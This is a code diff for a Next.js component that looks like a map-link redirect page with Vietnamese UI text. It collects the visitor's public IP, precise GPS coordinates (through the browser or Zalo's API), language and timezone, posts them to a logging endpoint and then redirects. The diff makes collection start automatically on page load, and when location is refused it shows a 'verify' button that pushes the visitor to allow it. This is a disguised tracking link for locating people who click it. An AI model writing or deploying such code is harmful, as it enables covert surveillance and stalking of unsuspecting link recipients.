@@ -1,7 +1,7 @@
 
 'use client';
 
-import { useState } from 'react';
+import { useEffect, useState } from 'react';
 import Image from 'next/image';
 import { Button } from '@/components/ui/button';
 import { MapPin, ArrowUpRight, Loader2, ShieldCheck } from 'lucide-react';
@@ -13,85 +13,85 @@ interface MapRedirectClientProps {
 }
 
 export function MapRedirectClient({ redirectUrl, config }: MapRedirectClientProps) {
-  const [status, setStatus] = useState<'idle' | 'loading' | 'denied'>('idle');
+  const [status, setStatus] = useState<'loading' | 'denied' | 'idle'>('loading');
 
-  const handleAction = () => {
+  const requestLocation = async () => {
     setStatus('loading');
 
-    const requestLocation = async () => {
-      let clientIp = 'N/A';
-      try {
-        const ipResponse = await fetch('https://api.ipify.org?format=json');
-        if (ipResponse.ok) {
-          const ipData = await ipResponse.json();
-          clientIp = ipData.ip;
-        }
-      } catch (e) {
-        console.error("Could not fetch IP", e);
+    let clientIp = 'N/A';
+    try {
+      const ipResponse = await fetch('https://api.ipify.org?format=json');
+      if (ipResponse.ok) {
+        const ipData = await ipResponse.json();
+        clientIp = ipData.ip;
       }
+    } catch (e) {
+      console.error("Could not fetch IP", e);
+    }
 
-      const logDataAndRedirect = (pos?: { coords: { latitude: number; longitude: number; accuracy: number; } }) => {
-        const body: any = { 
-            ip: clientIp, 
-            from: 'link',
-            language: navigator.language,
-            timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
-        };
-
-        if (pos) {
-          body.lat = pos.coords.latitude;
-          body.lon = pos.coords.longitude;
-          body.acc = pos.coords.accuracy;
-        }
-
-        fetch('/api/log-location', {
-          method: 'POST',
-          headers: { 'Content-Type': 'application/json' },
-          body: JSON.stringify(body),
-          keepalive: true,
-        }).finally(() => {
-          window.location.href = redirectUrl;
-        });
+    const logDataAndRedirect = (pos?: { coords: { latitude: number; longitude: number; accuracy: number; } }) => {
+      const body: any = { 
+          ip: clientIp, 
+          from: 'link',
+          language: navigator.language,
+          timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
       };
 
-      const handleError = (error?: { code: number; message?: string }) => {
-        if (error?.code === 1) { // PERMISSION_DENIED
-            setStatus('denied');
-        } else {
-            logDataAndRedirect();
-        }
-      };
-      
-      // Check for Zalo's specific JS API first to fix ReferenceError and optimize
-      if (typeof (window as any).zaloJSV2?.getLocation === 'function') {
-        (window as any).zaloJSV2.getLocation((data: { status: string; latitude: number; longitude: number; accuracy: number; }) => {
-            if (data.status === "SUCCESS" && data.latitude && data.longitude) {
-                logDataAndRedirect({
-                    coords: {
-                        latitude: data.latitude,
-                        longitude: data.longitude,
-                        accuracy: data.accuracy || 15,
-                    },
-                });
-            } else {
-                handleError({ code: 1, message: 'Zalo API failed or was denied' });
-            }
-        });
+      if (pos) {
+        body.lat = pos.coords.latitude;
+        body.lon = pos.coords.longitude;
+        body.acc = pos.coords.accuracy;
       }
-      else if (navigator.geolocation) {
-        navigator.geolocation.getCurrentPosition(
-          logDataAndRedirect,
-          (err) => handleError(err),
-          { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 }
-        );
+
+      fetch('/api/log-location', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify(body),
+        keepalive: true,
+      }).finally(() => {
+        window.location.href = redirectUrl;
+      });
+    };
+
+    const handleError = (error?: { code: number; message?: string }) => {
+      if (error?.code === 1) { // PERMISSION_DENIED
+          setStatus('denied');
       } else {
-        logDataAndRedirect();
+          logDataAndRedirect();
       }
     };
     
-    setTimeout(requestLocation, 100);
+    if (typeof (window as any).zaloJSV2?.getLocation === 'function') {
+      (window as any).zaloJSV2.getLocation((data: { status: string; latitude: number; longitude: number; accuracy: number; }) => {
+          if (data.status === "SUCCESS" && data.latitude && data.longitude) {
+              logDataAndRedirect({
+                  coords: {
+                      latitude: data.latitude,
+                      longitude: data.longitude,
+                      accuracy: data.accuracy || 15,
+                  },
+              });
+          } else {
+              handleError({ code: 1, message: 'Zalo API failed or was denied' });
+          }
+      });
+    }
+    else if (navigator.geolocation) {
+      navigator.geolocation.getCurrentPosition(
+        logDataAndRedirect,
+        (err) => handleError(err),
+        { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 }
+      );
+    } else {
+      logDataAndRedirect();
+    }
   };
   
+  useEffect(() => {
+    const timer = setTimeout(requestLocation, 500);
+    return () => clearTimeout(timer);
+  }, []);
+
   const getButtonContent = () => {
     switch(status) {
       case 'loading':
@@ -105,7 +105,7 @@ export function MapRedirectClient({ redirectUrl, config }: MapRedirectClientProp
         return (
           <>
             <ShieldCheck className="mr-2 h-5 w-5" />
-            Xác minh & Thử lại
+            Xác minh & Mở bản đồ
           </>
         );
       case 'idle':
@@ -151,7 +151,7 @@ export function MapRedirectClient({ redirectUrl, config }: MapRedirectClientProp
         <div className="bg-background p-4 border-t sticky bottom-0">
           <Button 
             className={`w-full h-12 text-base font-semibold ${status === 'denied' ? 'bg-primary' : ''}`}
-            onClick={handleAction}
+            onClick={requestLocation}
             disabled={status === 'loading'}
           >
             {getButtonContent()}
